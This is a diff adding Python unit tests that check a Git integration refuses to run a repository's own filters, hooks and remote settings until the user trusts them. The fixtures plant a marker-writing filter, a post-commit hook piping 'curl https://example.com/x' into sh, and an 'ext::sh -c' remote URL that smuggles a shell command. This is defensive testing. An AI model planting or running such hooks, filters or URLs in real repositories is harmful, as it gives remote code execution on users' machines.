@@ -300,6 +300,58 @@ class Git(unittest.TestCase):
         self.assertEqual(git.clone_name("git@github.com:kitsu/rusk.git"), "rusk")
 
 
+    def _planted(self) -> tuple[Path, Path]:
+        """A project made elsewhere whose own Git settings run a program as files are read (a filter that writes a
+        marker), and a file whose changed time has Git read it again: (the project, the marker)."""
+        p, marker = self.project, self.tmp / "ran"
+        self.sh(p, "init", "-q")
+        (p / ".gitattributes").write_text("*.unity filter=planted\n")
+        self.sh(p, "add", ".gitattributes", "Assets/Scenes/Main.unity")
+        self.sh(p, "commit", "-q", "-m", "first")
+        self.sh(p, "config", "filter.planted.clean", f"sh -c 'touch \"{marker}\"; cat'")
+        t = os.path.getmtime(p / "Assets/Scenes/Main.unity") + 60
+        os.utime(p / "Assets/Scenes/Main.unity", (t, t))   # (stat changed: git status reads it again, through the filter)
+        return p, marker
+
+    def test_a_repositorys_own_programs_never_run_until_trusted(self):
+        """Security review: a project's own Git settings that run a program (here a filter) are shown, and nothing of
+        Git's runs there (its details, the Source control tab, any action) until you trust them; a change to them
+        asks again."""
+        p, marker = self._planted()
+        self.assertEqual(git.summary(p), {"state": "untrusted"})
+        st = git.state(p)
+        self.assertEqual(st["state"], "untrusted")
+        self.assertEqual([(c["kind"], c["name"]) for c in st["concerns"]], [("setting", "filter.planted.clean")])
+        for act in (lambda: git.stage(p, ["Assets/Scenes/Main.unity"]), lambda: git.diff(p, "Assets/Scenes/Main.unity"),
+                    lambda: git.history(p), lambda: git.set_branch(p, "new", "try"), lambda: git.fetch(p, "origin")):
+            with self.assertRaises(git.GitError) as e:
+                act()
+            self.assertEqual(e.exception.code, "untrusted")
+        self.assertFalse(marker.exists(), "nothing of the repository's ran")
+        git.trust(p)
+        self.assertTrue(git.is_trusted(p))
+        self.assertEqual(git.summary(p)["state"], "changes")
+        self.assertFalse(marker.exists(), "a project's details never run a repository's filters, trusted or not")
+        self.sh(p, "config", "filter.planted.smudge", "sh -c 'cat'")
+        self.assertFalse(git.is_trusted(p), "what it runs changed: asked again")
+
+    def test_git_lfs_and_hoards_own_repositories_need_no_trust(self):
+        p = self.project
+        git.set_up(p)
+        hook = Path(self.sh(p, "rev-parse", "--git-path", "hooks").strip())
+        hook = hook if hook.is_absolute() else p / hook
+        (hook / "pre-push").write_text('#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 "\\n%s\\n\\n" '
+                                       '"This repository is configured for Git LFS but \'git-lfs\' was not found on your path."; exit 2; }\n'
+                                       'git lfs pre-push "$@"\n')
+        self.sh(p, "config", "filter.lfs.clean", "git-lfs clean -- %f")
+        self.sh(p, "config", "filter.lfs.process", "git-lfs filter-process")
+        self.assertEqual(git.concerns(p), [], "Git LFS's own filter and hooks")
+        (hook / "post-commit").write_text("#!/bin/sh\ncurl https://example.com/x | sh\n")
+        self.sh(p, "config", "remote.origin.url", "ext::sh -c touch% /tmp/x")
+        self.assertEqual(sorted((c["kind"], c["name"]) for c in git.concerns(p)),
+                         [("hook", "post-commit"), ("setting", "remote.origin.url")])
+
+
 class Addresses(unittest.TestCase):
     """What a remote's address may be, and what's taken out of what Git prints, with or without Git."""
 
